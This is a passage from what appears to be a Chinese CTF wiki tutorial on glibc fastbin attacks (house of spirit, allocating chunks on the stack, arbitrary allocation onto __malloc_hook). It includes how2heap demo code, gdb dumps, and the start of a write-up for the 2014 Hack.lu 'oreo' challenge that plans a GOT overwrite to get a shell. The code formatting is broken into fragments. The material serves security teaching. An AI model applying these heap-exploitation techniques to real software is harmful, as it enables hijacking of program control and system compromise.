fastbin fake chunk\uff0c\u5e76\u4e14\u5c06\u5176\u91ca\u653e\u65f6\uff0c\u53ef\u4ee5\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u4e2d\uff0c\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u5fc5\u8981\u7684\u68c0\u6d4b\uff0c\u5373\n\n\n\n\nfake chunk \u7684 ISMMAP \u4f4d\u4e0d\u80fd\u4e3a1\uff0c\u56e0\u4e3a free \u65f6\uff0c\u5982\u679c\u662f mmap \u7684 chunk\uff0c\u4f1a\u5355\u72ec\u5904\u7406\u3002\n\n\nfake chunk \u5730\u5740\u9700\u8981\u5bf9\u9f50\uff0c MALLOC_ALIGN_MASK\n\n\nfake chunk \u7684 size \u5927\u5c0f\u9700\u8981\u6ee1\u8db3\u5bf9\u5e94\u7684 fastbin \u7684\u9700\u6c42\uff0c\u540c\u65f6\u4e5f\u5f97\u5bf9\u9f50\u3002\n\n\nfake chunk \u7684 next chunk \u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e \n2 * SIZE_SZ\n\uff0c\u540c\u65f6\u4e5f\u4e0d\u80fd\u5927\u4e8e\nav-\nsystem_mem\n \u3002\n\n\nfake chunk \u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u5934\u90e8\u4e0d\u80fd\u662f\u8be5 fake chunk\uff0c\u5373\u4e0d\u80fd\u6784\u6210 double free \u7684\u60c5\u51b5\u3002\n\n\n\n\n\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u7ed5\u8fc7\u8fd9\u4e9b\u68c0\u6d4b\uff0c\u53ef\u4ee5\u53c2\u8003 free \u90e8\u5206\u7684\u6e90\u7801\u3002\n\n\n\u6f14\u793a\n\n\n\u8fd9\u91cc\u5c31\u76f4\u63a5\u4ee5 how2heap \u4e0a\u7684\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff0c\u5982\u4e0b\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstdlib.h\n\n\n\nint\n \nmain\n()\n\n\n{\n\n    \nfprintf\n(\nstderr\n,\n \nThis file demonstrates the house of spirit attack.\n\\n\n);\n\n\n    \nfprintf\n(\nstderr\n,\n \nCalling malloc() once so that it sets up its memory.\n\\n\n);\n\n    \nmalloc\n(\n1\n);\n\n\n    \nfprintf\n(\nstderr\n,\n \nWe will now overwrite a pointer to point to a fake \nfastbin\n region.\n\\n\n);\n\n    \nunsigned\n \nlong\n \nlong\n \n*\na\n;\n\n    \n// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)\n\n    \nunsigned\n \nlong\n \nlong\n \nfake_chunks\n[\n10\n]\n \n__attribute__\n \n((\naligned\n \n(\n16\n)));\n\n\n    \nfprintf\n(\nstderr\n,\n \nThis region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n\\n\n,\n \nsizeof\n(\nfake_chunks\n),\n \nfake_chunks\n[\n1\n],\n \nfake_chunks\n[\n7\n]);\n\n\n    \nfprintf\n(\nstderr\n,\n \nThis chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (\n= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n\\n\n);\n\n    \nfprintf\n(\nstderr\n,\n \n... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n\\n\n);\n\n    \nfake_chunks\n[\n1\n]\n \n=\n \n0x40\n;\n \n// this is the size\n\n\n    \nfprintf\n(\nstderr\n,\n \nThe chunk.size of the *next* fake region has to be sane. That is \n 2*SIZE_SZ (\n 16 on x64) \n \n av-\nsystem_mem (\n 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n\\n\n);\n\n        \n// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8\n\n    \nfake_chunks\n[\n9\n]\n \n=\n \n0x1234\n;\n \n// nextsize\n\n\n    \nfprintf\n(\nstderr\n,\n \nNow we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n\\n\n,\n \nfake_chunks\n[\n1\n]);\n\n    \nfprintf\n(\nstderr\n,\n \n... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n\\n\n);\n\n    \na\n \n=\n \nfake_chunks\n[\n2\n];\n\n\n    \nfprintf\n(\nstderr\n,\n \nFreeing the overwritten pointer.\n\\n\n);\n\n    \nfree\n(\na\n);\n\n\n    \nfprintf\n(\nstderr\n,\n \nNow the next malloc will return the region of our fake chunk at %p, which will be %p!\n\\n\n,\n \nfake_chunks\n[\n1\n],\n \nfake_chunks\n[\n2\n]);\n\n    \nfprintf\n(\nstderr\n,\n \nmalloc(0x30): %p\n\\n\n,\n \nmalloc\n(\n0x30\n));\n\n\n}\n\n\n\n\n\n\u8fd0\u884c\u540e\u7684\u6548\u679c\u5982\u4e0b\n\n\n\u279c  how2heap git:\n(\nmaster\n)\n ./house_of_spirit \nThis file demonstrates the house of spirit attack.\nCalling malloc\n()\n once so that it sets up its memory.\nWe will now overwrite a pointer to point to a fake \nfastbin\n region.\nThis region \n(\nmemory of length: \n80\n)\n contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.\nThis chunk.size of this region has to be \n16\n more than the region \n(\nto accomodate the chunk data\n)\n \nwhile\n still falling into the fastbin category \n(\n=\n \n128\n on x64\n)\n. The PREV_INUSE \n(\nlsb\n)\n bit is ignored by free \nfor\n fastbin-sized chunks, however the IS_MMAPPED \n(\nsecond lsb\n)\n and NON_MAIN_ARENA \n(\nthird lsb\n)\n bits cause problems.\n... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work \nfor\n the malloc parameter at the end. \nThe chunk.size of the *next* fake region has to be sane. That is \n \n2\n*SIZE_SZ \n(\n \n16\n on x64\n)\n \n \n av-\nsystem_mem \n(\n 128kb by default \nfor\n the main arena\n)\n to pass the nextsize integrity checks. No need \nfor\n fastbin size.\nNow we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.\n... note that the memory address of the *region* associated with this chunk must be \n16\n-byte aligned.\nFreeing the overwritten pointer.\nNow the next malloc will \nreturn\n the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!\nmalloc\n(\n0x30\n)\n: 0x7ffd9bceaa60\n\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u60f3\u8981\u4f7f\u7528\u8be5\u6280\u672f\u5206\u914d chunk \u5230\u6307\u5b9a\u5730\u5740\uff0c\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u4efb\u4f55\u5185\u5bb9\uff0c\n\u5173\u952e\u662f\u8981\u80fd\u591f\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u524d\u540e\u7684\u5185\u5bb9\u4f7f\u5176\u53ef\u4ee5\u7ed5\u8fc7\u5bf9\u5e94\u7684\u68c0\u6d4b\n\u3002\n\n\nAlloc to Stack\n\n\n\u4ecb\u7ecd\n\n\n\u5982\u679c\u4f60\u5df2\u7ecf\u7406\u89e3\u4e86\u524d\u6587\u6240\u8bb2\u7684 Fastbin Double Free \u4e0e house of spirit \u6280\u672f\uff0c\u90a3\u4e48\u7406\u89e3\u8be5\u6280\u672f\u5c31\u5df2\u7ecf\u4e0d\u6210\u95ee\u9898\u4e86\uff0c\u5b83\u4eec\u7684\u672c\u8d28\u90fd\u5728\u4e8e fastbin \u94fe\u8868\u7684\u7279\u6027\uff1a\u5f53\u524d chunk \u7684 fd \u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a chunk\u3002\n\n\n\u8be5\u6280\u672f\u7684\u6838\u5fc3\u70b9\u5728\u4e8e\u52ab\u6301 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u6307\u9488\uff0c\u628a fd \u6307\u9488\u6307\u5411\u6211\u4eec\u60f3\u8981\u5206\u914d\u7684\u6808\u4e0a\uff0c\u4ece\u800c\u5b9e\u73b0\u63a7\u5236\u6808\u4e2d\u7684\u4e00\u4e9b\u5173\u952e\u6570\u636e\uff0c\u6bd4\u5982\u8fd4\u56de\u5730\u5740\u7b49\u3002\n\n\n\u6f14\u793a\n\n\n\u8fd9\u6b21\u6211\u4eec\u628a fake_chunk \u7f6e\u4e8e\u6808\u4e2d\u79f0\u4e3a stack_chunk\uff0c\u540c\u65f6\u52ab\u6301\u4e86 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u503c\uff0c\u901a\u8fc7\u628a\u8fd9\u4e2a fd \u503c\u6307\u5411 stack_chunk \u5c31\u53ef\u4ee5\u5b9e\u73b0\u5728\u6808\u4e2d\u5206\u914d fastbin chunk\u3002\n\ntypedef struct _chunk\n{\n    long long pre_size;\n    long long size;\n    long long fd;\n    long long bk;  \n} CHUNK,*PCHUNK;\n\nint main(void)\n{\n    CHUNK stack_chunk;\n\n    void *chunk1;\n    void *chunk_a;\n\n    stack_chunk.size=0x21;\n    chunk1=malloc(0x10);\n\n    free(chunk1);\n\n    *(long long *)chunk1=\nstack_chunk;\n    malloc(0x10);\n    chunk_a=malloc(0x10);\n    return 0;\n}\n\n\n\u901a\u8fc7 gdb \u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u9996\u5148\u628a chunk1 \u7684 fd \u6307\u9488\u6307\u5411\u4e86 stack_chunk\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== chunk1\n0x602010:   0x00007fffffffde60  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 \n=== top chunk\n\n\n\u4e4b\u540e\u7b2c\u4e00\u6b21 malloc \u4f7f\u5f97 fastbin \u94fe\u8868\u6307\u5411\u4e86 stack_chunk\uff0c\u8fd9\u610f\u5473\u7740\u4e0b\u4e00\u6b21\u5206\u914d\u4f1a\u4f7f\u7528 stack_chunk \u7684\u5185\u5b58\u8fdb\u884c\n\n0x7ffff7dd1b20 \nmain_arena\n:    0x0000000000000000 \n=== unsorted bin\n0x7ffff7dd1b28 \nmain_arena+8\n:  0x00007fffffffde60 \n=== fastbin[0]\n0x7ffff7dd1b30 \nmain_arena+16\n: 0x0000000000000000  \n\n\n\u6700\u7ec8\u7b2c\u4e8c\u6b21malloc\u8fd4\u56de\u503c\u4e3a0x00007fffffffde70\u4e5f\u5c31\u662fstack_chunk\n\n   0x400629 \nmain+83\n        call   0x4004c0 \nmalloc@plt\n\n \u2192 0x40062e \nmain+88\n        mov    QWORD PTR [rbp-0x38], rax\n   $rax   : 0x00007fffffffde70\n\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- \n0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- \n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u901a\u8fc7\u8be5\u6280\u672f\u6211\u4eec\u53ef\u4ee5\u628a fastbin chunk \u5206\u914d\u5230\u6808\u4e2d\uff0c\u4ece\u800c\u63a7\u5236\u8fd4\u56de\u5730\u5740\u7b49\u5173\u952e\u6570\u636e\u3002\u8981\u5b9e\u73b0\u8fd9\u4e00\u70b9\u6211\u4eec\u9700\u8981\u52ab\u6301fastbin \u4e2d chunk \u7684 fd \u57df\uff0c\u628a\u5b83\u6307\u5230\u6808\u4e0a\uff0c\u5f53\u7136\u540c\u65f6\u9700\u8981\u6808\u4e0a\u5b58\u5728\u6709\u6ee1\u8db3\u6761\u4ef6\u7684size\u503c\u3002\n\n\nArbitrary Alloc\n\n\n\u4ecb\u7ecd\n\n\nArbitrary Alloc \u5176\u5b9e\u4e0e Alloc to stack \u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u5206\u914d\u7684\u76ee\u6807\u4e0d\u518d\u662f\u6808\u4e2d\u3002\n\u4e8b\u5b9e\u4e0a\u53ea\u8981\u6ee1\u8db3\u76ee\u6807\u5730\u5740\u5b58\u5728\u5408\u6cd5\u7684 size \u57df\uff08\u8fd9\u4e2a size \u57df\u662f\u6784\u9020\u7684\uff0c\u8fd8\u662f\u81ea\u7136\u5b58\u5728\u7684\u90fd\u65e0\u59a8\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a chunk \u5206\u914d\u5230\u4efb\u610f\u7684\u53ef\u5199\u5185\u5b58\u4e2d\uff0c\u6bd4\u5982bss\u3001heap\u3001data\u3001stack\u7b49\u7b49\u3002\n\n\n\u6f14\u793a\n\n\n\u5728\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4f7f\u7528\u5b57\u8282\u9519\u4f4d\u6765\u5b9e\u73b0\u76f4\u63a5\u5206\u914d fastbin \u5230\n_malloc_hook\u7684\u4f4d\u7f6e\uff0c\u76f8\u5f53\u4e8e\u8986\u76d6_malloc_hook\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\n\n\nint main(void)\n{\n\n\n    void *chunk1;\n    void *chunk_a;\n\n    chunk1=malloc(0x60);\n\n    free(chunk1);\n\n    *(long long *)chunk1=0x7ffff7dd1b05;\n    malloc(0x60);\n    chunk_a=malloc(0x60);\n    return 0;\n}\n\n\n\u8fd9\u91cc\u76840x7ffff7dd1b05\u662f\u6211\u6839\u636e\u672c\u673a\u7684\u60c5\u51b5\u5f97\u51fa\u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u662f\u600e\u4e48\u83b7\u5f97\u7684\u5462\uff1f\u9996\u5148\u6211\u4eec\u8981\u89c2\u5bdf\u6b32\u5199\u5165\u5730\u5740\u9644\u8fd1\u662f\u5426\u5b58\u5728\u53ef\u4ee5\u5b57\u8282\u9519\u4f4d\u7684\u60c5\u51b5\u3002\n\n0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1b10 \n__malloc_hook\n: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0\n\n\n0x7ffff7dd1b10 \u662f\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684 __malloc_hook \u7684\u5730\u5740\uff0c\u4e8e\u662f\u6211\u4eec\u5411\u4e0a\u5bfb\u627e\u662f\u5426\u53ef\u4ee5\u9519\u4f4d\u51fa\u4e00\u4e2a\u5408\u6cd5\u7684size\u57df\u3002\u56e0\u4e3a\u8fd9\u4e2a\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u56e0\u6b64 fastbin \u7684\u8303\u56f4\u4e3a32\u5b57\u8282\u5230128\u5b57\u8282(0x20-0x80)\uff0c\u5982\u4e0b\uff1a\n\n//\u8fd9\u91cc\u7684size\u6307\u7528\u6237\u533a\u57df\uff0c\u56e0\u6b64\u8981\u5c0f2\u500dSIZE_SZ\nFastbins[idx=0, size=0x10] \nFastbins[idx=1, size=0x20] \nFastbins[idx=2, size=0x30] \nFastbins[idx=3, size=0x40] \nFastbins[idx=4, size=0x50] \nFastbins[idx=5, size=0x60] \nFastbins[idx=6, size=0x70] \n\n\n\u901a\u8fc7\u89c2\u5bdf\u53d1\u73b0 0x7ffff7dd1af5 \u5904\u53ef\u4ee5\u73b0\u5b9e\u9519\u4f4d\u6784\u9020\u51fa\u4e00\u4e2a0x000000000000007f\n\n0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n\n0x7ffff7dd1af5 \n_IO_wide_data_0+309\n:   0x000000000000007f\n\n\n\u56e0\u4e3a 0x7f \u5728\u8ba1\u7b97 fastbin index \u65f6\uff0c\u662f\u5c5e\u4e8e index 5 \u7684\uff0c\u5373 chunk \u5927\u5c0f\u4e3a 0x70 \u7684\u3002\n\n\n##define fastbin_index(sz)                                                      \\\n\n\n    ((((unsigned int) (sz)) \n (SIZE_SZ == 8 ? 4 : 3)) - 2)\n\n\n\n\n\n\u800c\u5176\u5927\u5c0f\u53c8\u5305\u542b\u4e86 0x10 \u7684 chunk_header\uff0c\u56e0\u6b64\u6211\u4eec\u9009\u62e9\u5206\u914d 0x60 \u7684 fastbin\uff0c\u5c06\u5176\u52a0\u5165\u94fe\u8868\u3002\n\u6700\u540e\u7ecf\u8fc7\u4e24\u6b21\u5206\u914d\u53ef\u4ee5\u89c2\u5bdf\u5230 chunk \u88ab\u5206\u914d\u5230 0x00007ffff7dd1b15\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 __malloc_hook\u7684\u5185\u5bb9\u3002\n\n\n0x4005a8 \nmain+66\n        call   0x400450 \nmalloc@plt\n\n \u2192   0x4005ad \nmain+71\n        mov    QWORD PTR [rbp-0x8], rax\n\n $rax   : 0x00007ffff7dd1b15 \n\n0x7ffff7dd1b05 \n__memalign_hook+5\n: 0xfff7a92a0000007f  0x000000000000007f\n0x7ffff7dd1b15 \n__malloc_hook+5\n:   0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b25 \nmain_arena+5\n:  0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b35 \nmain_arena+21\n: 0x0000000000000000  0x0000000000000000\n\n\n\n\n\u5c0f\u603b\u7ed3\n\n\nArbitrary Alloc \u5728 CTF \u4e2d\u7528\u5730\u66f4\u52a0\u9891\u7e41\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b57\u8282\u9519\u4f4d\u7b49\u65b9\u6cd5\u6765\u7ed5\u8fc7 size \u57df\u7684\u68c0\u9a8c\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d chunk\uff0c\u6700\u540e\u7684\u6548\u679c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u3002\n\n\n2014 hack.lu oreo\n\n\n\u57fa\u672c\u5206\u6790\n\n\n\u279c  2014_Hack.lu_oreo git:\n(\nmaster\n)\n file oreo\noreo: ELF \n32\n-bit LSB executable, Intel \n80386\n, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib/ld-linux.so.2, \nfor\n GNU/Linux \n2\n.6.26, BuildID\n[\nsha1\n]=\nf591eececd05c63140b9d658578aea6c24450f8b, stripped\n\u279c  2014_Hack.lu_oreo git:\n(\nmaster\n)\n checksec oreo         \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo\n\n    Arch:     i386-32-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u662f\u6bd4\u8f83\u8001\u7684\uff0c32\u4f4d\u7a0b\u5e8f\uff0c\u52a8\u6001\u94fe\u63a5\uff0c\u5c31\u8fde RELRO \u6280\u672f\u4e5f\u6ca1\u6709\u4e0a\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5e76\u6ca1\u6709\u8fdb\u884c setvbuf \u64cd\u4f5c\uff0c\u56e0\u6b64\u5728\u521d\u6b21\u6267\u884c io \u51fd\u6570\u65f6\uff0c\u4f1a\u5728\u5806\u4e0a\u5206\u914d\u7a7a\u95f4\u3002\n\n\n\u6b63\u5982\u7a0b\u5e8f\u4e2d\u76f4\u63a5\u8f93\u51fa\u7684\u4fe1\u606f\uff0c\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u539f\u59cb\u7684\u5728\u7ebf\u67aa\u652f\u7cfb\u7edf\u3002\u5176\u4e2d\uff0c\u6839\u636e\u6dfb\u52a0\u67aa\u652f\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u67aa\u652f\u7684\u57fa\u672c\u7ed3\u6784\u5982\u4e0b\n\n\n00000000\n \nrifle\n           \nstruc\n \n;\n \n(\nsizeof\n=\n0x38\n,\n \nmappedto_5\n)\n\n\n00000000\n \ndescript\n        \ndb\n \n25\n \ndup\n(\n?\n)\n\n\n0000001\n9\n \nname\n            \ndb\n \n27\n \ndup\n(\n?\n)\n\n\n00000034\n \nnext\n            \ndd\n \n?\n                    \n;\n \noffset\n\n\n0000003\n8\n \nrifle\n           \nends\n\n\n\n\n\n\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u5982\u4e0b\n\n\n\n\n\u6dfb\u52a0\u67aa\u652f\uff0c\u5176\u4e3b\u8981\u4f1a\u8bfb\u53d6\u67aa\u652f\u7684\u540d\u5b57\u4e0e\u63cf\u8ff0\u3002\u4f46\u95ee\u9898\u5728\u4e8e\u8bfb\u53d6\u7684\u540d\u5b57\u7684\u957f\u5ea6\u8fc7\u957f\uff0c\u53ef\u4ee5\u8986\u76d6 next \u6307\u9488\u4ee5\u53ca\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u3002\u53ef\u4ee5\u8986\u76d6\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u5927\u5c0f\u4e3a 56-(56-27)=27 \u5927\u5c0f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e9b\u67aa\u652f\u7684\u5927\u5c0f\u90fd\u662f\u5728fastbin \u8303\u56f4\u5185\u7684\u3002\n\n\n\u5c55\u793a\u6dfb\u52a0\u67aa\u652f\uff0c\u5373\u4ece\u5934\u5230\u5c3e\u8f93\u51fa\u67aa\u652f\u7684\u63cf\u8ff0\u4e0e\u540d\u5b57\u3002\n\n\n\u8ba2\u5df2\u7ecf\u9009\u62e9\u7684\u67aa\u652f\uff0c\u5373\u5c06\u6240\u6709\u5df2\u7ecf\u6dfb\u52a0\u7684\u67aa\u652f\u91ca\u653e\u6389\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u7f6e\u4e3aNULL\u3002\n\n\n\u7559\u4e0b\u8ba2\u8d27\u6d88\u606f\n\n\n\u5c55\u793a\u76ee\u524d\u72b6\u6001\uff0c\u5373\u6dfb\u52a0\u4e86\u591a\u5c11\u53ea\u67aa\uff0c\u8ba2\u4e86\u591a\u5c11\u5355\uff0c\u7559\u4e0b\u4e86\u4ec0\u4e48\u4fe1\u606f\u3002\n\n\n\n\n\u4e0d\u96be\u5206\u6790\u5f97\u5230\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u4e3b\u8981\u5b58\u5728\u4e8e\u6dfb\u52a0\u67aa\u652f\u65f6\u7684\u5806\u6ea2\u51fa\u6f0f\u6d1e\u3002\n\n\n\u5229\u7528\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u5b58\u5728\u5806\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u63a7\u5236 next \u6307\u9488\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 next \u6307\u9488\u6307\u5411\u7a0b\u5e8f\u4e2d got \u8868\u7684\u4f4d\u7f6e\u3002\u5f53\u8fdb\u884c\u5c55\u793a\u7684\u65f6\u5019\uff0c\u5373\u53ef\u4ee5\u8f93\u51fa\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u540c\u65f6\u9700\u8981\u786e\u4fdd\u5047\u8bbe\u5bf9\u5e94\u5730\u5740\u4e3a\u4e00\u4e2a\u67aa\u652f\u7ed3\u6784\u4f53\u65f6\uff0c\u5176 next \u6307\u9488\u4e3a NULL\u3002\u8fd9\u91cc\u6211\u91c7\u7528 puts@got\u3002\u901a\u8fc7\u8fd9\u6837\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\u51fa libc \u57fa\u5730\u5740\uff0c\u4ee5\u53ca system \u51fd\u6570\u5730\u5740\u3002\n\n\n\u7531\u4e8e\u67aa\u652f\u7ed3\u6784\u4f53\u5927\u5c0f\u662f 0x38 \u5927\u5c0f\uff0c\u6240\u4ee5\u5176\u5bf9\u5e94\u7684 chunk \u4e3a 0x40\u3002\u8fd9\u91cc\u91c7\u7528 \nhouse of sprit\n \u7684\u6280\u672f\u6765\u8fd4\u56de 0x0804A2A8 \u5904\u7684chunk\uff0c\u5373\u7559\u4e0b\u7684\u6d88\u606f\u7684\u6307\u9488\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6e 0x0804A2A4 \u5904\u7684\u5185\u5bb9\u4e3a 0x40\uff0c\u5373\u9700\u8981\u6dfb\u52a0 0x40 \u652f\u67aa\u652f\uff0c\u4ece\u800c\u7ed5\u8fc7\u5927\u5c0f\u68c0\u6d4b\u3002\u540c\u65f6\u4e3a\u4e86\u786e\u4fdd\u53ef\u4ee5\u7ed5\u8fc7 next chunk \u7684\u68c0\u6d4b\uff0c\u8fd9\u91cc\u6211\u4eec\u7f16\u8f91\u7559\u4e0b\u7684\u6d88\u606f\u3002\n\n\n\u5728\u6210\u529f\u5206\u914d\u8fd9\u6837\u7684 chunk \u540e\uff0c\u6211\u4eec\u5176\u5b9e\u5c31\u6709\u4e86\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u4fee\u6539\u7684\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4fee\u6539\u4e00\u4e2a\u5408\u9002\u7684 got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u83b7\u5f97 shell\u3002\n\n\n\n\n\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nterminal\n \n=\n \n[\ngnome-terminal\n,\n \n-x\n,\n \nsh\n,\n \n-c\n]\n\n\nif\n \nargs\n[\nDEBUG\n]:\n\n    \ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ncontext\n.\nbinary\n \n=\n \n./oreo\n\n\noreo\n \n=\n 